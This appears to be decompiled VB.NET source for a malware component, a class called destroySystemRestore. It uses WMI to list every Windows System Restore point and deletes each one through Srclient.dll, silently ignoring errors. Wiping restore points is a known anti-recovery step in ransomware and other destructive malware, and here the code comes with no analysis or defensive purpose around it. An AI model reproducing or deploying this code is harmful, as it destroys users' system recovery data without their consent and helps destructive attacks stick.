Imports System
Imports System.Management
Imports System.Runtime.InteropServices
Imports System.Text

Namespace Main.Tools
	' Token: 0x0200005C RID: 92
	Public Class destroySystemRestore
		' Token: 0x060001D6 RID: 470
		Public Declare Function DeleteRestorePoint Lib "Srclient.dll" (index As Integer) As Integer

		' Token: 0x060001D7 RID: 471 RVA: 0x000113A4 File Offset: 0x0000F5A4
		Public Shared Sub SearchAndDestroySystemRestore()
			Try
				Dim managementClass As ManagementClass = New ManagementClass("\\.\root\default", "systemrestore", New ObjectGetOptions())
				Dim instances As ManagementObjectCollection = managementClass.GetInstances()
				Dim array As String() = New String(99) {}
				Dim num As Integer = 0
				Using enumerator As ManagementObjectCollection.ManagementObjectEnumerator = instances.GetEnumerator()
					While enumerator.MoveNext()
						Dim managementBaseObject As ManagementBaseObject = enumerator.Current
						Dim managementObject As ManagementObject = CType(managementBaseObject, ManagementObject)
						array(num) = CUInt(managementObject("sequencenumber")).ToString()
						num += 1
					End While
					GoTo IL_8A
				End Using
				IL_78:
				destroySystemRestore.DeleteRestorePoint(Convert.ToInt32(array(num)))
				num -= 1
				IL_8A:
				If num >= 0 Then
					GoTo IL_78
				End If
			Catch
			End Try
		End Sub

		' Token: 0x060001D8 RID: 472 RVA: 0x00011468 File Offset: 0x0000F668
		Public Sub deleteRestorePoints()
			Try
				Dim managementClass As ManagementClass = New ManagementClass("\\.\root\default", "systemrestore", New ObjectGetOptions())
				Dim instances As ManagementObjectCollection = managementClass.GetInstances()
				New StringBuilder()
				For Each managementBaseObject As ManagementBaseObject In instances
					Dim managementObject As ManagementObject = CType(managementBaseObject, ManagementObject)
					Dim num As Integer = Integer.Parse(CUInt(managementObject("sequencenumber")).ToString())
					Console.WriteLine("System Functions >> Deleted Restore Point: " + CUInt(managementObject("sequencenumber")))
					destroySystemRestore.DeleteRestorePoint(num)
				Next
			Catch ex As Exception
			End Try
		End Sub
	End Class
End Namespace
